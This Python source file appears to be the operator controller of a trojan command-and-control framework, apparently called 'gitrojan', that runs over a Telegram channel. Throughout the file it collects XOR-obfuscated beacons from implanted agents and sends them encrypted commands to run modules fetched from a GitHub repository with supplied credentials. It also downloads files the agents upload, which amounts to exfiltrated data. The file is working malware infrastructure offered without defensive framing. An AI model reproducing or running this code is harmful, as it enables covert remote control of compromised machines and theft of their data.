#!/usr/bin/env python3

import os
import uuid
import json
import base64
import asyncio
import datetime
import threading

from io import BytesIO
from typing import Optional
from dotenv import load_dotenv, find_dotenv
from telethon import TelegramClient, events
from telethon.tl.types import MessageMediaDocument
from telethon.errors import SessionPasswordNeededError

from shared.utils import xor

from controller.cli import keyboard_listener, exec_module, interactive_triggered

class TgController:
    def __init__(self, session_name, api_id, api_hash, phone_number, channel):
        self.api_id       = api_id
        self.api_hash     = api_hash
        self.phone_number = phone_number
        self.channel      = channel
        self.client       = TelegramClient(session_name, api_id, api_hash)

    async def connect(self):
        await self.client.connect()
        if not await self.client.is_user_authorized():
            await self.client.send_code_request(self.phone_number)
            code = input("[?] Enter the code sent to your Telegram app: ")
            try:
                await self.client.sign_in(self.phone_number, code)
            except SessionPasswordNeededError:
                password = input("[?] Two-step verification enabled. Enter your password: ")
                await self.client.sign_in(password=password)
        print(f"[+] Logged in as {(await self.client.get_me()).username}")

    async def send_message(self, text: str):
        """
        Sends a message to the pre-defined channel.
        """
        await self.client.send_message(self.channel, text)
        print(f"[>] Sent: {text}")

    async def poll_messages(self, limit: int = 10, filter_fn: callable = None, filter_by_fn: callable = None) -> list:
        """
        Pulls latest messages from the channel.

        :param limit: Number of messages to fetch
        :param filter_fn: Optional function to filter messages
        :return: List of matching messages
        """
        messages = []
        async for msg in self.client.iter_messages(self.channel, limit=limit):
            if msg.text:
                if filter_fn is None or filter_fn(msg, filter_by_fn):
                    messages.append(msg)
        return messages

class Session:
    def __init__(self,
                 token: str,
                 api_id: int,
                 api_hash: str,
                 phone_number: str,
                 channel: str,
                 g_user: Optional[str] = None,
                 g_token: Optional[str] = None,
                 repo: Optional[str] = None,
                 topic_id: Optional[str] = None):
        def create_session_env(bootstrap_token: str,
                               token: str,
                               filepath: Optional[str] = None):
            """Agent session env"""
            if filepath is None:
                filepath         = ".env.a"
            with open(filepath, 'w') as f:
                f.write(f"TOKEN={token}\n")
                f.write(f"BTOKEN={bootstrap_token}")

        self.comms               = TgController(
            f"anon{uuid.uuid4().hex[:5]}",
            api_id,
            api_hash,
            phone_number,
            channel
        )
        self.token               = token
        if topic_id is None:
            self.topic_id        = uuid.uuid4().hex[:10]
        else:
            self.topic_id        = topic_id
        self.bootstrap_token     = f"{self.topic_id}:{uuid.uuid4().hex[:32]}"
        self.agents              = list()
        self.files               = list()
        self.g_user              = g_user
        self.g_token             = g_token
        self.repo                = repo
        self.mdl_config          = list()

        self.mdl_config.append("gitrojan/config/def.json") # Default config
        create_session_env(self.bootstrap_token, self.token)

    @classmethod
    async def create(cls, 
            token: str,
            api_id: int,
            api_hash: str,
            phone_number: str,
            channel: str,
            g_user: Optional[str] = None,
            g_token: Optional[str] = None,
            repo: Optional[str] = None,
            topic_id: Optional[str] = None):
        self = cls(token, api_id, api_hash, phone_number, channel, g_user, g_token, repo, topic_id)
        await self.comms.connect()
        return self

    def is_beacon_msg(self, msg, dec_fn: callable) -> bool:
        text         = msg.text
        text_s       = text.split(":")
        if len(text_s) != 2 and self.topic_id != text_s[0]:
            return False
        try:
            raw      = base64.b64decode(text_s[1])
            comp     = (self.topic_id + self.bootstrap_token.split(":")[1])
            dec_text = dec_fn(raw, comp)
            text     = json.loads(dec_text)
            # print(text)
        except:
            return False
        msg          = text.get("msg", None)
        if msg is None and "BEACON" not in msg:
            return False
        agent_id     = text["agent_id"]
        if agent_id not in self.agents:
            self.agents.append(agent_id)
        return True

    def is_agent_media(self, msg, dec_fn: callable = None) -> bool:
        return msg.media and isinstance(msg.media, MessageMediaDocument)

    async def send_ping(self, enc_fn: callable):
        payload      = {
            "msg": "PING:"+":".join(self.agents),
            "timestamp": datetime.datetime.now().timestamp()
        }
        json_payload = json.dumps(payload).encode()
        comp_key     = self.topic_id + self.bootstrap_token
        enc_payload  = enc_fn(json_payload, comp_key)
        enc_data     = base64.b64encode(enc_payload).decode()
        await self.comms.send_message(f"{self.topic_id}:{enc_data}")

    async def exec_mdl(self, mdl: str, agent_id: str, enc_fn: callable):
        if self.g_user is not None and \
            self.g_token is not None and \
            self.repo is not None:
            payload      = {
                "agent_id": agent_id,
                "mdl": mdl,
                "user": self.g_user,
                "token": self.g_token,
                "repo": self.repo,
                "timestamp": datetime.datetime.now().timestamp()
            }
            json_payload = json.dumps(payload).encode()
            comp_key     = self.topic_id + agent_id
            enc_payload  = enc_fn(json_payload, comp_key)
            enc_data     = base64.b64encode(enc_payload).decode()
            await self.comms.send_message(f"{self.topic_id}:{enc_data}")
            print(f"[{agent_id}] exec {mdl} config")

    async def proc_msgs(self, enc_fn: callable):
        topic_agents = len(self.agents)
        await self.comms.poll_messages(filter_fn=self.is_beacon_msg, filter_by_fn=enc_fn)
        if len(self.agents) > topic_agents:
            print(f"[+] Agents: {len(self.agents)}")
            await self.send_ping(enc_fn)
        msgs = await self.comms.poll_messages(filter_fn=self.is_agent_media)
        for file_msg in msgs:
            file = file_msg.file
            if file.name not in self.files and \
                file.name.split('_')[0] == self.topic_id:
                print(f"[+] File received: {file.name}")
                file_bytes_io = BytesIO()
                await self.comms.client.download_media(file_msg, file=file_bytes_io)
                raw_data = file_bytes_io.getvalue()
                text     = None
                for agent_id in self.agents:
                    try:
                        raw      = base64.b64decode(raw_data)
                        comp     = (self.topic_id + agent_id)
                        dec_text = enc_fn(raw, comp)
                        text     = json.loads(dec_text)
                    except:
                        continue
                    if text is not None:
                        break
                print(f"[<] {text}")
                self.files.append(file.name)

if __name__ == "__main__":
    load_dotenv(find_dotenv(".env.c"))
    token     = os.getenv("TOKEN")
    api_id    = int(os.getenv("API_ID"))
    api_hash  = os.getenv("API_HASH")
    phone_nbr = os.getenv("PHONE_NBR")
    channel   = os.getenv("CHANNEL")
    #-----------------------------------
    user      = os.getenv("G_USER")
    passwd    = os.getenv("G_PASSWD")
    repo      = os.getenv("G_REPO")

    async def start():
        session = await Session.create(
            token,
            api_id,
            api_hash,
            phone_nbr,
            channel,
            g_user=user,
            g_token=passwd,
            repo=repo
        )
        await session.comms.send_message("/start")
        await session.proc_msgs(enc_fn=xor)
        loop = asyncio.get_running_loop()
        threading.Thread(target=keyboard_listener, args=(loop,), daemon=True).start()
        print("▶ Press 'm' to execute modules.")

        while True:
            await session.proc_msgs(enc_fn=xor)
            print("---------------------")
            print(f"[+] Agents: {len(session.agents)}")
            print(f"[+] Files received: {len(session.files)}")

            if interactive_triggered.is_set():
                interactive_triggered.clear()
                await exec_module(session, enc_fn=xor)

            await asyncio.sleep(5)

    asyncio.run(start())